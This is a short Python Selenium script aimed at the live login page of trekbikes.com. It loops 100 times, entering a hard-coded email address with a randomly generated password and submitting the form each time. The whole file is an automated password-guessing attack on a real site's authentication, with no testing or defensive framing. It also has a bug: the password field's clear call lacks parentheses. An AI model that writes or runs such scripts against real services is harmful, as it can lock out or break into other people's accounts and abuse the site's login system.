from selenium import webdriver
import os
import random
import time
PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "chromedriver.exe")
email = "koberok911@timevod.com"
def id_generator(Largo=8, chars="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" ):
    return ''.join(random.choice(chars) for _ in range(Largo))



CHROME_BROWSER = webdriver.Chrome(PATH)
CHROME_BROWSER.get("https://www.trekbikes.com/us/en_US/login/")
for i in range(0,100):
    print("Iteración N°:",i)
    time.sleep(15)
    CHROME_BROWSER.find_element_by_id("j_username").clear()
    CHROME_BROWSER.find_element_by_id("j_username").send_keys(email)
    CHROME_BROWSER.find_element_by_id("j_password").clear
    CHROME_BROWSER.find_element_by_id("j_password").send_keys(id_generator())
    CHROME_BROWSER.find_element_by_xpath('//button[normalize-space()="Log in"]').click()